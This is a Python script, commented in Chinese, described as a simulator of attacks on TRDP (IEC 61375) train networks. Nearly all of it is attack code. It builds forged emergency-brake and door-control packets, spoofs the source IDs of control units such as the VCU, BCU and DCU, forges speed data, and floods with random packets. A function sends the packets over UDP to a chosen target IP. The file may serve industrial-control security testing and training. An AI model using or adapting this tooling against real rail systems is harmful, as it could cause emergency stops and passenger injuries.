"""
工控漏洞模拟器 - TRDP (IEC 61375)
==================================
基于 IEC 61375-2-3 标准的列车通信协议漏洞模拟。

漏洞类型:
1. PD 数据伪造 — 伪造列车运行状态 (速度/制动/车门)
2. 紧急制动注入 — 注入虚假紧急制动指令
3. 车门控制注入 — 伪造车门开关指令
4. 重放攻击 — 重放合法 TRDP 报文
5. DoS 攻击 — 大量无效报文
6. 源 ID 欺骗 — 伪装成其他车辆单元发送指令
"""

import struct
import time
import random
import socket
from typing import Dict, Any, List, Optional
from enum import Enum

TRDP_PD_PORT = 17224
TRDP_MD_PORT = 17225
TRDP_HEADER_LEN = 40


class VulnType(Enum):
    PD_SPOOF = 'pd_spoof'
    BRAKE_INJECT = 'brake_inject'
    DOOR_INJECT = 'door_inject'
    REPLAY = 'replay'
    DOS = 'dos'
    SOURCE_SPOOF = 'source_spoof'


def _hdr(op: int = 2, com: int = 0x1000, etb: int = 1, src: int = 0xFF,
         dst: int = 0, seq: int = 1, flags: int = 0, payload: bytes = b'') -> bytes:
    """构造 TRDP 40 字节固定头"""
    ts = int(time.time() * 1000000)
    remain_life = 4000
    return struct.pack(
        '!HHIHHHIQQHHH',
        0x0100, op, com, etb, src, dst,
        seq, ts, remain_life, flags, len(payload), 0
    ) + payload


def _pd_signal(com_id: int, value: float) -> bytes:
    """编码 TRDP PD 信号 (4B ComId + 4B float)"""
    return struct.pack('!H', com_id) + struct.pack('!H', 0) + struct.pack('!f', value)


def _pd_signal_int(com_id: int, value: int) -> bytes:
    """编码 TRDP PD 信号 (4B ComId + 4B int)"""
    return struct.pack('!H', com_id) + struct.pack('!H', 0) + struct.pack('!I', value)


def build_pd_packet(signals: Dict[int, float], src_id: int = 1,
                    seq: int = 1, dst_id: int = 0) -> bytes:
    """构造含多信号的 TRDP PD 报文"""
    payload = b''
    for com_id, val in signals.items():
        payload += struct.pack('!I', com_id) + struct.pack('!f', val)
    return _hdr(op=2, com=0x1000, src=src_id, dst=dst_id, seq=seq, payload=payload)


def build_emergency_brake(src_id: int = 3, seq: int = 1) -> bytes:
    """构造紧急制动报文"""
    payload = _pd_signal_int(0x000A, 1)  # EmergencyBrake = True
    payload += _pd_signal(0x0001, 0.0)   # Speed = 0
    payload += _pd_signal(0x0002, 900.0)  # BrakePressure = 900kPa
    return _hdr(op=2, com=0x000A, src=src_id, seq=seq,
                flags=0x0004, payload=payload)


class TRDPVulnSim:
    """TRDP 漏洞模拟器"""

    def __init__(self, target: Optional[str] = None):
        self.target = target
        self._seq = 0

    def pd_spoof(self) -> Dict[str, Any]:
        """PD 数据伪造"""
        self._seq += 1
        print('[+] TRDP PD 数据伪造...')

        # 正常状态
        normal = build_pd_packet({0x0001: 60.0, 0x0002: 200.0, 0x0003: 0.0,
                                  0x0006: 25.0, 0x000A: 0.0})
        # 伪造故障状态: 速度0 + 最大制动 + 紧急制动
        fake = build_emergency_brake(src_id=1, seq=self._seq)

        print(f'  正常: speed=60km/h brake=200kPa emergency=False')
        print(f'  伪造: speed=0km/h brake=900kPa emergency=True')
        print(f'  正常报文: {len(normal)}B  伪造报文: {len(fake)}B')
        print(f'  [!] 伪造 PD 报文可导致列车控制系统基于虚假数据误判')

        return {
            'vuln': 'PD_SPOOF',
            'success': True,
            'detail': '构造虚假列车PD报文: 紧急制动状态',
            'normal_packet': normal,
            'spoof_packet': fake,
        }

    def brake_inject(self) -> Dict[str, Any]:
        """紧急制动注入"""
        self._seq += 1
        print('[+] 紧急制动注入...')

        pkt = build_emergency_brake(src_id=3, seq=self._seq)

        print(f'  源ID=3 (伪装VCU - 车辆控制单元)')
        print(f'  ComID=0x000A (EmergencyBrake=1)')
        print(f'  标志位: emergency=True')
        print(f'  [!] 伪造紧急制动可导致全列车紧急刹车')
        print(f'  [!] 实际攻击效果: 列车急停、乘客受伤风险')

        return {
            'vuln': 'BRAKE_INJECT',
            'success': True,
            'detail': f'紧急制动注入报文 ({len(pkt)}B)',
            'packet': pkt,
        }

    def door_inject(self) -> Dict[str, Any]:
        """车门控制注入"""
        print('[+] 车门控制注入...')
        self._seq += 1

        signals = [
            (0x0003, 0.0, '关闭'),
            (0x0003, 1.0, '开启'),
            (0x0003, 0.0, '关闭'),
        ]

        packets = []
        for com_id, val, desc in signals:
            self._seq += 1
            payload = struct.pack('!I', com_id) + struct.pack('!f', val)
            pkt = _hdr(op=2, com=com_id, src=0x04, seq=self._seq, payload=payload)
            packets.append(pkt)
            print(f'  seq={self._seq}: DoorStatus={int(val)} ({desc}) [{len(pkt)}B]')

        print(f'  源ID=0x04 (伪装DCU - 车门控制单元)')
        print(f'  [!] 伪造车门状态可导致安全系统误判')
        print(f'  [!] 风险: 实际车门状态与报告状态不一致')

        return {
            'vuln': 'DOOR_INJECT',
            'success': True,
            'detail': f'车门状态伪造 ({len(packets)} 个报文)',
            'packets': packets,
        }

    def replay(self) -> Dict[str, Any]:
        """重放攻击"""
        print('[+] TRDP 重放攻击...')

        # 构造一个合法报文
        now = int(time.time() * 1000000)
        original = struct.pack(
            '!HHIHHHIQQHHH',
            0x0100, 2, 0x0001, 1, 1, 0,
            100, now, 4000, 0, 4, 0
        ) + struct.pack('!f', 75.0)

        print(f'  捕获 TRDP 报文:')
        print(f'    src_id=1, seq=100, comId=0x0001(Speed), val=75.0km/h')
        print(f'    timestamp={now}')

        time.sleep(0.5)

        # 延时后重放相同报文
        print(f'  重放相同报文 (含原始时间戳):')
        print(f'    [!] IED 接收端无法区分重放报文')
        print(f'    [!] 风险: 过时的速度数据导致控制逻辑错误')

        return {
            'vuln': 'REPLAY',
            'success': True,
            'detail': '重放合法 TRDP 报文 (无时间戳校验)',
            'original': original,
            'replay': original,
        }

    def dos(self, n: int = 500) -> Dict[str, Any]:
        """DoS 攻击 — 大量随机 TRDP 报文"""
        print(f'[+] TRDP DoS 攻击 ({n} 个报文)...')

        start = time.time()
        for i in range(n):
            payload = bytes(random.randint(0, 255) for _ in range(random.randint(10, 50)))
            _hdr(op=random.choice([0, 1, 2, 2, 2, 0xFF]),
                 com=random.randint(0, 0xFFFF),
                 src=random.randint(0, 0xFF),
                 seq=random.randint(0, 0xFFFFFFFF),
                 payload=payload)
        elapsed = time.time() - start

        print(f'  生成 {n} 个随机 TRDP 报文, {elapsed:.1f}s')
        print(f'  速率: {n/elapsed:.0f} pps')
        print(f'  [!] 风险: 列车骨干网带宽耗尽、控制单元 CPU 过载')

        return {
            'vuln': 'TRDP_DOS',
            'success': True,
            'detail': f'{n} 报文/{elapsed:.1f}s ({n/elapsed:.0f} pps)',
        }

    def source_spoof(self) -> Dict[str, Any]:
        """源 ID 欺骗 — 伪装成不同车辆单元"""
        print('[+] TRDP 源 ID 欺骗...')
        self._seq += 1

        devices = [
            (0x01, 'VCU - 车辆控制单元', 60.0),
            (0x02, 'TCU - 牵引控制单元', 55.0),
            (0x03, 'BCU - 制动控制单元', 50.0),
            (0x04, 'DCU - 车门控制单元', 45.0),
            (0x06, 'PIS - 乘客信息系统', 40.0),
        ]

        packets = []
        for dev_id, dev_name, speed in devices:
            self._seq += 1
            pkt = _hdr(op=2, com=0x0001, src=dev_id, seq=self._seq,
                        payload=struct.pack('!I', 0x0001) + struct.pack('!f', speed))
            packets.append(pkt)
            print(f'  源ID=0x{dev_id:02x} ({dev_name}): speed={speed}km/h')

        print(f'  [!] 攻击者可伪造任意源 ID 发送欺诈报文')
        print(f'  [!] 风险: 多个伪装的车辆单元可协同攻击')

        return {
            'vuln': 'SOURCE_SPOOF',
            'success': True,
            'detail': f'伪装 {len(devices)} 个不同车辆单元发送报文',
            'packets': packets,
        }

    def send_packet(self, packet: bytes, port: int = TRDP_PD_PORT) -> bool:
        """发送 TRDP 报文到目标 (如需实际网络发送)"""
        if not self.target:
            print('  [-] 未指定目标地址，跳过发送')
            return False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(packet, (self.target, port))
            s.close()
            return True
        except Exception as e:
            print(f'  [-] 发送失败: {e}')
            return False


def run_all(target: Optional[str] = None):
    """运行所有漏洞模拟"""
    print('TRDP (IEC 61375) 漏洞模拟器\n')
    v = TRDPVulnSim(target)

    exploits = [
        ('PD 数据伪造', v.pd_spoof),
        ('紧急制动注入', v.brake_inject),
        ('车门控制注入', v.door_inject),
        ('重放攻击', v.replay),
        ('源 ID 欺骗', v.source_spoof),
        ('DoS 攻击', lambda: v.dos(300)),
    ]

    for name, fn in exploits:
        print(f'--- [{name}] ---')
        r = fn()
        print(f'  {"[OK]" if r["success"] else "[FAIL]"} {r["detail"]}\n')


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='TRDP 漏洞模拟器')
    parser.add_argument('--target', help='目标 IP (可选，不指定则不发送)')
    parser.add_argument('--vuln', choices=[v.value for v in VulnType] + ['all'],
                        default='all', help='漏洞类型')
    args = parser.parse_args()

    v = TRDPVulnSim(args.target)

    if args.vuln == 'all':
        run_all(args.target)
    else:
        vuln_map = {
            'pd_spoof': ('PD 数据伪造', v.pd_spoof),
            'brake_inject': ('紧急制动注入', v.brake_inject),
            'door_inject': ('车门控制注入', v.door_inject),
            'replay': ('重放攻击', v.replay),
            'source_spoof': ('源 ID 欺骗', v.source_spoof),
            'dos': ('DoS', lambda: v.dos(300)),
        }
        name, fn = vuln_map[args.vuln]
        print(f'--- [{name}] ---')
        r = fn()
        print(f'  {"[OK]" if r["success"] else "[FAIL]"} {r["detail"]}')
